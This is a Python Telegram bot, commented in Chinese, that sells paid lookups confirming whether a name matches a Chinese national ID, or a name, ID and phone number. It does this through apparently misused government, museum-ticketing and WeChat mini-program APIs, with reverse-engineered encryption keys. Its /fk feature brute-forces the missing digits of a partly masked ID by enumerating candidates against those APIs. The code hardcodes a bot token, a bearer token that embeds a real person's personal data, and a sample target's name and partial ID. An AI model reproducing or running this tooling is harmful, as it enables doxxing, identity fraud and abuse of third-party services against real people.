import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
import binascii
import random
import concurrent.futures
import inspect  
import urllib.parse
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor
from base64 import b64decode, b64encode
from urllib.parse import quote

# 核心加密组件 (用于新二要素)
try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("❌ 核心加密组件未安装, 请安装: pip install cryptography")

# 屏蔽 SSL 证书报警
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ================= 1. 核心配置 =================
API_TOKEN = '8505048236:AAFHPC3448Gti60whSAC9mak_oKzd7BN1eY'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'

# 默认的终极裁判 Bearer Token（支持通过 /token 指令在线修改）
JUDGE_AUTH = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNXc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"

# 新二要素国政接口配置
API_USERINFO = "https://quickapp.gjzwfw.gov.cn/account/normal/userinfo-desensit"
KEY_BASE64 = "YXVlQmdQTFR1OFY2NXRnVQ=="
IV_BASE64 = "YXVlQmdQTFR1OFY2NXRnVQ=="
ENCRY_AES_KEY = """koKocx3nMhyWVVLVIeIwvczakLlcPFak1ILtZJpjD26FhZAYAG47kKlIQgZYCoT3e+L5yH2FYOT3
5Go847D1ihIvuUbqCenMKHBq5ms2v3Oj+n4lW4rncE5sNDXGO3RJO6yB1gXHl6AOEsTHSqVUSx5B
O5H5c9V6W+zk+ZQXgtg1BOK8uMtN+tfr8nFuyxZnWlMt0kRe/KYb9bw/3P+5XiQHZQcYP5KUNr/X
AatNmX47bA7htq5vowxnvy4gQ5ZGjVa4CZNzp4lrORV2FR/autfXFoEnFvwix9K9tP5SwvUDza8s
YA1fYcstRM2N910pfVaXgYUMSaR2AMtTwiMJ4K3y+sgfA4trXI61J34Lf/AspuuV5q9lTfcHlloH
HOZhIkgRA4wrZGVmxCSYX3uV76OrnupW9hi/nwzCRfmw46PdPE+rjtSoZlc8aLp5CbIvWxlXsScM
q0g/4yr90EC6Gn4BnTbHYJz+yjnVxofPnDWCyz/xkUdFNKCyFfx+XSt7"""

bot = telebot.TeleBot(API_TOKEN)
user_points = {}
user_states = {}

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
        except: pass
    return pts

user_points = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)


# ==================== AES加密类 ====================
class AESCipher:
    def __init__(self):
        self.key = b64decode(KEY_BASE64)
        self.iv = b64decode(IV_BASE64)

    def encrypt(self, plaintext: str) -> str:
        aesgcm = AESGCM(self.key)
        encrypted_bytes = aesgcm.encrypt(self.iv, plaintext.encode('utf-8'), None)
        return b64encode(encrypted_bytes).decode('utf-8')

def format_encry_aes_key():
    return ENCRY_AES_KEY.replace('\n', '%0A').replace('+', '%2B').replace('/', '%2F')


# ================= 2. 核心核验算法组件 =================

def is_valid_id_data(n):
    """身份证合法性检查(精确算法)"""
    if len(n) != 18: return False
    try:
        year, month, day = int(n[6:10]), int(n[10:12]), int(n[12:14])
        if not (1950 <= year <= 2026 and 1 <= month <= 12 and 1 <= day <= 31): return False
    except: return False
    var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
    try:
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17].upper()
    except: return False

def get_auth_from_file():
    file_name = "token.txt"
    if not os.path.exists(file_name):
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(JUDGE_AUTH)
        return JUDGE_AUTH
    with open(file_name, "r", encoding="utf-8") as f:
        auth = f.read().strip()
        return auth if auth else JUDGE_AUTH

def verify_museum(id_num, target_name, headers, url):
    """接口1:博物馆过滤器"""
    payload = {
        "contactName": target_name,
        "contactPhone": "15815067442",
        "documentType": "RLY0101",
        "documentNumber": id_num,
        "isPartyMember": 0, "myself": 0
    }
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=8)
        res_json = response.json()
        if (res_json.get("code") == 200 and res_json.get("data") is True) or ("已存在" in res_json.get("msg", "")):
            return True
        return False
    except: return False

def final_judge(id_num, target_name):
    """接口2:二要素终极裁判"""
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    judge_auth = get_auth_from_file()
    
    headers = {
        "Authorization": judge_auth,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x1800442a) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"
    }
    payload = {"name": target_name, "idCardNo": id_num}
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        result = response.json()
        return result.get("code") == 0 and result.get("success") is True
    except: return False


# ================= 3. 补齐爆破异步逻辑 (带进度条) =================

def make_progress_bar(percent, width=10):
    """生成进度条字符串"""
    hashes = int(round(percent / 100.0 * width))
    spaces = width - hashes
    return "[" + "█" * hashes + "░" * spaces + f"] {percent}%"

def run_fk_expansion(chat_id, target_name, card_mask, uid):
    """在独立线程中运行身份证补齐核验，避免卡死机器人"""
    # 扣除积分
    user_points[uid] -= 50.0
    save_points()

    wait_msg = bot.send_message(chat_id, "⏳ 正在初始化爆破字典，请稍后...")
    
    museum_url = "https://newticket.szmuseum.com/japi/sw-saas-cloud/customerContact/save"
    auth_token = "请在此处粘贴最新的AuthorizationC" # 如果有独立文件读取可在这里替换
    
    headers = {
        "Host": "newticket.szmuseum.com",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68 NetType/WIFI Language/zh_CN",
        "AuthorizationC": auth_token,
        "token": "f3Qu372W6kD3HJzZvKvqy9VNCBZX+/txdZA42yjgQQY=",
        "appId": "9eadb789046543df8b229ae99bb6e8ec"
    }

    # 1. 字典构建
    char_sets = [list("0123456789")] * 18
    for i, ch in enumerate(card_mask):
        if ch != 'x': char_sets[i] = [ch]
        elif i == 17: char_sets[i] = list("0123456789X")

    valid_ids = ["".join(r) for r in itertools.product(*char_sets) if is_valid_id_data("".join(r))]
    total_count = len(valid_ids)
    
    if total_count == 0:
        bot.edit_message_text("❌ 未生成任何合法的身份证组合，请检查输入格式是否正确。", chat_id, wait_msg.message_id)
        return

    bot.edit_message_text(f"📊 字典生成成功：共 {total_count} 条。开始第一轮全量初筛...", chat_id, wait_msg.message_id)

    # 2. 线程池初筛及动态进度条更新
    success_list = []
    list_lock = threading.Lock()
    completed = 0

    def task_worker(id_num):
        nonlocal completed
        time.sleep(random.uniform(0.05, 0.15))
        res = verify_museum(id_num, target_name, headers, museum_url)
        with list_lock:
            completed += 1
            if res: success_list.append(id_num)

    # 用另一个线程定期刷新 Telegram 上的进度条
    def progress_updater():
        last_percent = -1
        while completed < total_count:
            percent = int((completed / total_count) * 100)
            if percent != last_percent:
                try:
                    bar = make_progress_bar(percent)
                    bot.edit_message_text(f"⏳ <b>正在进行第一轮初筛核验...</b>\n\n进度: {bar}\n已处理: {completed}/{total_count}", chat_id, wait_msg.message_id, parse_mode='HTML')
                    last_percent = percent
                except: pass
            time.sleep(1.2)

    updater_thread = threading.Thread(target=progress_updater)
    updater_thread.start()

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(task_worker, valid_ids)

    updater_thread.join() # 等待进度刷新结束

    # 3. 二次精准复核
    if success_list:
        bot.edit_message_text(f"🟡 第一轮初筛结束，发现 {len(success_list)} 个疑似目标，正在启动二要素精准裁判复核...", chat_id, wait_msg.message_id)
        verified_final = None
        
        for index, sid in enumerate(success_list):
            try:
                bot.edit_message_text(f"🔄 正在终审裁判复核 ({index+1}/{len(success_list)}):\n<code>{sid}</code>", chat_id, wait_msg.message_id, parse_mode='HTML')
            except: pass
            time.sleep(1.2) 
            if final_judge(sid, target_name):
                verified_final = sid
                break 

        if verified_final:
            result_text = (
                f"🎉 <b>身份证补齐成功！</b>\n\n"
                f"<b>姓名:</b> {target_name}\n"
                f"<b>匹配身份证:</b> <code>{verified_final}</code>\n\n"
                f"✅ <b>终审二要素验证成功！</b>\n"
                f"🪙 <b>已扣除 50 积分！余额: {user_points[uid]:.2f}</b>"
            )
            bot.delete_message(chat_id, wait_msg.message_id)
            bot.send_message(chat_id, result_text, parse_mode='HTML')
        else:
            bot.send_message(chat_id, f"❌ 遗憾，初选出的 {len(success_list)} 个号码均未通过二要素终审。\n🪙 <b>已扣除 50 积分！余额: {user_points[uid]:.2f}</b>")
    else:
        bot.edit_message_text(f"❌ 核验结束，字典内所有组合均未匹配成功。\n🪙 <b>已扣除 50 积分！余额: {user_points[uid]:.2f}</b>", chat_id, wait_msg.message_id, parse_mode='HTML')


def query_3ys_logic(chat_id, name, id_card, phone, uid):
    """三要素核验"""
    wait_msg = bot.send_message(chat_id, "⏳ 正在核验...")
    url = "http://xiaowunb.top/3ys.php"
    params = {"name": name, "sfz": id_card, "sjh": phone}
    try:
        response = requests.get(url, params=params, timeout=15); response.encoding = 'utf-8'
        user_points[uid] -= 0.05; save_points()
        clean_res = re.sub(r'小无 API.*?官方客服:@\w+', '', response.text.strip(), flags=re.DOTALL).strip()
        res_status = "三要素核验成功✅" if ("成功" in clean_res or "一致" in clean_res) else "三要素核验失败❌"
        bot.delete_message(chat_id, wait_msg.message_id)
        bot.send_message(chat_id, f"姓名:{name}\n手机号:{phone}\n身份证:{id_card}\n结果:{res_status}\n\n"
                                  f"<b>已扣除 0.05 积分!</b>\n<b>当前余额:{user_points[uid]:.2f}</b>", parse_mode='HTML')
    except Exception as e: bot.edit_message_text(f"⚠️ 核验异常: {str(e)}", chat_id, wait_msg.message_id)

def single_verify_2ys(chat_id, name, id_card, uid):
    """二要素核验 - 国政新接口"""
    wait_msg = bot.send_message(chat_id, "⏳ 正在进行国政二要素核验...")
    try:
        cipher = AESCipher()
        enc_name = cipher.encrypt(name)
        enc_id = cipher.encrypt(id_card)
    except Exception as crypto_err:
        bot.edit_message_text(f"❌ 加密组件出错: {crypto_err}\n请确保服务器环境已安装 cryptography 库。", chat_id, wait_msg.message_id)
        return

    body = f"encryAesKey={format_encry_aes_key()}&name={quote(enc_name)}&idNo={quote(enc_id)}"
    headers = {
        'brand': 'huawei',
        'version': '427',
        'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2)',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
    }
    try:
        resp = requests.post(API_USERINFO, headers=headers, data=body, timeout=15)
        resp_text = resp.text
        user_points[uid] -= 0.01; save_points()
        
        status_title = "🟡 二要素核验失败"
        status_detail = ""
        try:
            data = json.loads(resp_text)
            code = data.get("code")
            has_success = "success" in resp_text
            if has_success and "data" in data and data["data"]:
                status_title = "二要素核验一致✅"
                status_detail = f"\n<b>返回数据:</b> {data['data']}"
            elif "查询不到绑定号码" in resp_text:
                status_title = "二要素核验一致✅"
                status_detail = f"\n<b>国政:</b> 未查询到号码"
            elif "无此用户信息" in resp_text:
                status_title = "二要素核验一致✅"
                status_detail = f"\n<b>详情:</b> 无国政账号"
            elif code == 20000 and "验证失败" in resp_text:
                status_title = "二要素验证失败❌"
            else: status_detail = f"\n原始响应: {resp_text}"
        except: status_detail = f"\n原始响应: {resp_text}"

        result_msg = (
            f"<b>姓名:</b> {name}\n"
            f"<b>身份证:</b> <code>{id_card}</code>\n"
            f"<b>结果:</b> {status_title}{status_detail}\n\n"
            f"<b>已扣除 0.01 积分!</b>\n"
            f"<b>当前余额: {user_points[uid]:.2f} 积分</b>"
        )
        bot.delete_message(chat_id, wait_msg.message_id)
        bot.send_message(chat_id, result_msg, parse_mode='HTML')
    except Exception as e: bot.edit_message_text(f"❌ 请求异常: {str(e)}", chat_id, wait_msg.message_id)

# ================= 4. UI 菜单 =================

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"), types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url), types.InlineKeyboardButton("OkPay 充值", url=admin_url), types.InlineKeyboardButton("RMB 充值", url=admin_url), types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (f"<b>Admin@铭</b>\n\n"
            f"<b>用户 ID:</b> <code>{uid}</code>\n"
            f"<b>用户名称:</b> {first_name}\n"
            f"<b>用户名:</b> {username}\n"
            f"<b>当前余额:</b> <code>{pts:.2f}积分</code>\n\n"
            f"<b>使用帮助可查看使用教程</b>\n"
            f"<b>在线充值可支持24小时</b>\n"
            f"<b>1 USDT = 1 积分</b>")

# ================= 5. 消息与命令处理 =================

@bot.message_handler(commands=['start', '3ys', '2ys', 'fk', 'token', 'add'])
def handle_commands(message):
    uid, chat_id = message.from_user.id, message.chat.id
    cmd_parts = message.text.split()
    cmd = cmd_parts[0][1:]
    current_pts = user_points.get(uid, 0.0)

    if cmd == 'start':
        if uid not in user_points: user_points[uid] = 0.0
        bot.send_message(chat_id, get_main_text(message, uid, user_points[uid]), parse_mode='HTML', reply_markup=get_main_markup())
    
    elif cmd == '2ys':
        if current_pts < 0.01: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
        bot.send_message(chat_id, "请输入:姓名 身份证")
        
    elif cmd == '3ys':
        if current_pts < 0.05: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
        bot.send_message(chat_id, "请输入:姓名 身份证 手机号")
        
    elif cmd == 'fk':
        if current_pts < 50.0: return bot.send_message(chat_id, "<b>积分不足 50 积分, 无法使用身份证补齐爆破!</b>", parse_mode='HTML')
        if len(cmd_parts) < 3: return bot.send_message(chat_id, "⚠️ 格式错误！使用方法：<code>/fk 谢超宇 41052720100609xxxx</code>", parse_mode='HTML')
        name = cmd_parts[1]
        card_mask = cmd_parts[2].lower()
        threading.Thread(target=run_fk_expansion, args=(chat_id, name, card_mask, uid)).start()

    elif cmd == 'token':
        if uid == ADMIN_ID:
            if len(cmd_parts) < 2: return bot.reply_to(message, "⚠️ 请指定新的 Token。例如：`/token bearer xxx`")
            new_token = message.text.split(None, 1)[1].strip()
            with open("token.txt", "w", encoding="utf-8") as f:
                f.write(new_token)
            bot.reply_to(message, "✅ <b>裁判 Token 已成功在代码级与配置文件中动态替换！</b>", parse_mode='HTML')
        else: bot.reply_to(message, "⛔ 您没有权限访问此命令!")

    elif cmd == 'add':
        if uid == ADMIN_ID:
            try:
                target_uid = int(cmd_parts[1])
                add_amount = float(cmd_parts[2])
                user_points[target_uid] = user_points.get(target_uid, 0.0) + add_amount
                save_points()
                bot.reply_to(message, f"✅ 充值成功!\n用户 ID: <code>{target_uid}</code>\n充值金额: {add_amount}\n<b>当前总余额: {user_points[target_uid]:.2f} 积分</b>", parse_mode='HTML')
            except Exception as e: bot.reply_to(message, f"❌ 格式错误:/add 用户ID 金额")
        else: bot.reply_to(message, "⛔ 您没有权限访问此命令!")

@bot.message_handler(func=lambda m: True)
def handle_all_text(message):
    uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
    if text.startswith('/'): return
    current_pts = user_points.get(uid, 0.0)
    
    parts = re.split(r'[,,\s\n]+', text)
    
    # 【新增特有逻辑】小写x身份证补齐指令模糊自动识别
    if 'x' in text.lower() and len(parts) == 2:
        name, card_mask = None, None
        for x in parts:
            if not name and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): name = x
            elif not card_mask and re.match(r'^[0-9xX]{15,18}$', x): card_mask = x.lower()
        if name and card_mask:
            if current_pts < 50.0: return bot.send_message(chat_id, "<b>积分不足 50 积分, 无法使用身份证补齐爆破!</b>", parse_mode='HTML')
            threading.Thread(target=run_fk_expansion, args=(chat_id, name, card_mask, uid)).start()
            return

    # 三要素自动识别
    if len(parts) >= 3:
        n, p, i = None, None, None
        for x in parts:
            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
            elif not p and re.match(r'^1[3-9]\d{9}$', x): p = x
            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
        if n and p and i:
            if current_pts < 0.05: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
            return query_3ys_logic(chat_id, n, i, p, uid)
            
    # 二要素自动识别
    if len(parts) == 2:
        n, i = None, None
        for x in parts:
            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
        if n and i:
            if current_pts < 0.01: return bot.send_message(chat_id, "<b>积分不足,请先充值!</b>", parse_mode='HTML')
            return single_verify_2ys(chat_id, n, i, uid)
    
    bot.send_message(chat_id, "⚠️ 无法识别您的输入,请发送 /start 查看可用功能。")

# ================= 6. 回调处理 =================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
    
    if call.data == "view_help":
        help_text = (
            "<b>🛠️ 使用帮助</b>\n\n"
            "<b>名字-身份证核验 (企业级)</b>\n"
            "发送 /2ys 进行核验，或直接发：<code>张三 110101...</code>\n"
            "每次扣除 0.01 积分\n"
            "——————————————————\n"
            "<b>名字-手机号-身份证核验 (企业级)</b>\n"
            "发送 /3ys 进行核验，或直接发：<code>张三 110101... 139...</code>\n"
            "每次扣除 0.05 积分\n"
            "——————————————————\n"
            "<b>身份证模糊补齐爆破 (/fk)</b>\n"
            "发送 /fk 或直接发带小写 x 的数据：\n"
            "<b>智能字典生成+两轮穿透终审核验，带实时进度条</b>\n"
            "每次成功扣除 <b>50.0 积分</b>"
        )
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup(), parse_mode='HTML')
    elif call.data == "view_pay":
        bot.edit_message_text("🛍️ <b>请选择充值方式:</b>\n<b>1 USDT = 1 积分</b>", call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup(), parse_mode='HTML')
    elif call.data == "back_to_main":
        bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=get_main_markup())

if __name__ == '__main__':
    print("Bot 正在运行 (已集成进度条身份证补齐及 Token 在线替换组件)...")
    bot.infinity_polling(timeout=10)
